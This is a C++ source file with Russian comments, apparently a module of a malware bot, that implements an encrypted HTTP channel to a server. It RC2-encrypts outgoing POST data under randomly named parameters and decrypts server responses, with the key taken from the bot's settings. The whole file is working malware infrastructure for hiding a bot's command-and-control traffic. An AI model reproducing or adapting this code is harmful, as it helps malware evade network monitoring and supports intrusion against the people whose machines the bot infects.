//---------------------------------------------------------------------------

#include "BotCryptHTTP.h"

#include "GetApi.h"
#include "Crypt.h"
#include "Utils.h"
//---------------------------------------------------------------------------




//****************************************************************************
//  CryptHTTP -  методы шифрованного обмена с HTTP сервером
//****************************************************************************

//---------------------------------------------------------------------------
PCHAR PrepareHTTPBuffer(PCHAR Buf)
{
	// Функция отсекает лишние символы от зашифрованного буфера
	if (STRA::IsEmpty(Buf))
		return NULL;

	PCHAR S = Buf;

	// Отсекаем стартовые символы
//	while (*S != 0 && (*S == ' ' || *S == 10 || *S == 13)) S++;

	// Отсекаем конечные символы
	PCHAR E = STRA::End(S);

	while (E > S)
	{
		if (*E == ' ' || *E == 10 || *E == 13)
			*E = 0;
		else
			break;
		E--;
	}
	return S;
}

//---------------------------------------------------------------------------

bool HTTPBufferContainsLineBreaks(PCHAR Buf)
{
	// Функция возвращает истину если строка содержит символы перевода 10? 13
	if (Buf == NULL) return false;

	for (; *Buf != 0; Buf++)
	{
		if (*Buf == 10 || *Buf == 13)
            return true;
	}

    return false;
}


PCHAR DecodeHTTPBuffer(PCHAR InBuffer, PCHAR Password)
{
	// Функция декодирует зашифрованный текст, полученный в результате
	// HTTP запроса. Нюанс в том, что некоторые скрипты могут возвращать
	// текст не как один буфер а как несколько отдельно зашифрованных
	// строк, разделённых переводами строки

	PCHAR Buf = PrepareHTTPBuffer(InBuffer);
	if (STRA::IsEmpty(Buf)) return NULL;


	// Если строка не содержит символов перевода то просто декодируем буфер
	if (!HTTPBufferContainsLineBreaks(Buf))
	{
		DWORD Size = 0;
		RC2Crypt::DecodeStr(Password, Buf, Size);
		return Buf;
    }


	PStrings Source = Strings::Create();
    PStrings Dest   = Strings::Create();

	// Раскладываем текст по строкам и декодируем каждую строку отдельно
	Strings::SetText(Source, Buf);

	for (DWORD i = 0; i < Strings::Count(Source) - 1; i++)
    {
		PCHAR Str = Strings::GetItem(Source, i, false);
		if (STR::IsEmpty(Str))
			continue;

		// Декодируем строку
		DWORD Size = 0;
		RC2Crypt::DecodeStr(Password, Str, Size);
		Strings::Add(Dest, Str);
	}


    PCHAR Result = Strings::GetText(Dest);

	Strings::Free(Source);
	Strings::Free(Dest);

	return Result;
}
//---------------------------------------------------------------------------

// Загрузить шифрованный документ
bool CryptHTTP::Get(PCHAR URL, PCHAR Password, PCHAR *Buf, PHTTPResponseRec Response, bool MultiLineBuffer)
{
	if (STR::IsEmpty(URL))
		return false;
	bool Result = HTTP::Get(URL, Buf, Response);

	// Расшифровываем данные
	if (Result && !STR::IsEmpty(Password) && Buf != NULL)
	{
        *Buf = DecodeHTTPBuffer(*Buf, Password);
	}

	return Result;
}

//---------------------------------------------------------------------------

bool CryptHTTP::Post(PCHAR URL, PCHAR Password, PStrings Fields, PCHAR *Buf, PHTTPResponseRec Response, bool MultiLineBuffer)
{
	// Функция отправляет зашифрованные пост данные на указанный
	// адрес. ключ берётся из глобальных настроек бота
	if (STR::IsEmpty(URL) || Fields == NULL)
		return false;

	// Запаковываем и зашифровываем данные
	if (Password != NULL)
	{
		PCHAR Text = Strings::GetText(Fields, URLValueDelimeter);
		Strings::Clear(Fields);

		PCHAR Name = Random::RandomString(Random::Generate(3, 6), 'a', 'z');

		PCHAR Value = RC2Crypt::Encode((LPBYTE)Text, STR::Length(Text), Password);

		AddURLParam(Fields, Name, Value);

		STR::Free(Text);
		STR::Free(Name);
		STR::Free(Value);
    }

    bool Result = HTTP::Post(URL, Fields, Buf, Response);

	if (Result && !STR::IsEmpty(Password) && Buf != NULL)
	{
		*Buf = DecodeHTTPBuffer(*Buf, Password);
    }

	return Result;
}



//*****************************************************************************
// 									TCryptHTTP
//*****************************************************************************

void TCryptHTTP::DoBeforePostData(TBotStream* PostData)
{
	// Зашифровываем отправляемые данные
	if (!PostData || Password.IsEmpty() || Request.ContentType != FormDataURLEncoded)
		return;

	string Data = PostData->ReadToString();
	if (Data.IsEmpty()) return;

	PostData->SetSize(0);

	PCHAR Name  = Random::RandomString(Random::Generate(3, 6), 'a', 'z');
    PCHAR Value = RC2Crypt::Encode((LPBYTE)Data.t_str(), Data.Length(), Password.t_str());

	PCHAR EncodedValue = URLEncode(Value, STR::Length(Value));

	PostData->Write(Name, STR::Length(Name));
    PostData->Write("=", 1);
	PostData->Write(EncodedValue, STR::Length(EncodedValue));
	PostData->SetPosition(0);

	STR::Free(Name);
	STR::Free(Value);
    STR::Free(EncodedValue);
}
//----------------------------------------------------------------

void TCryptHTTP::DoDownloadCompleted(TBotStream* ResponseData)
{
	// Расшифровываем получнные данные
	if (Password.IsEmpty()) return;

	int Pos  = ResponseData->Position();
	DWORD Size = ResponseData->Size() - Pos; // Для совместимости с шифроапи DWORD

	if (Size == 0) return;

	// Загружаем данные
	TMemory Buf(Size + 1);

	Size = ResponseData->Read(Buf.Buf(), Size);
	*(Buf.AsStr() + Size) = 0;

	// Обрезаем поток данных
	ResponseData->SetSize(Pos);

	// В зашифрованном буфере возможна ситуация когда
	// данные будут зашифрованны блоками и разделены друг от
	// друга символами  новой строки.
	if (STRA::Scan(Buf.AsStr(), '\n') == NULL)
	{
		// Буфер сплошной, расшифровываем одним массивом
		if (RC2Crypt::Decode(Password.t_str(), Buf.AsStr(), Size))
		{
			ResponseData->Write(Buf.Buf(), Size);
		}
	}
	else
	{
		// Буфер является блочным
		TBotStrings Source;

		Source.SetText(Buf.AsStr());

		// Декодируем все строки
		int Count = Source.Count();
		for (int i = 0; i < Count; i++)
		{
			string Line = Source[i];
			if (Line.IsEmpty()) continue;

			Size = Line.Length();
			if (RC2Crypt::Decode(Password.t_str(),Line.t_str(), Size))
			{
				ResponseData->Write(Line.t_str(), Size);
				if (i < Count)
					ResponseData->Write(LineBreak, 2);
            }
		}
	}

	// Восстонавливаем исходную позицию
	ResponseData->SetPosition(Pos);
}
//----------------------------------------------------------------
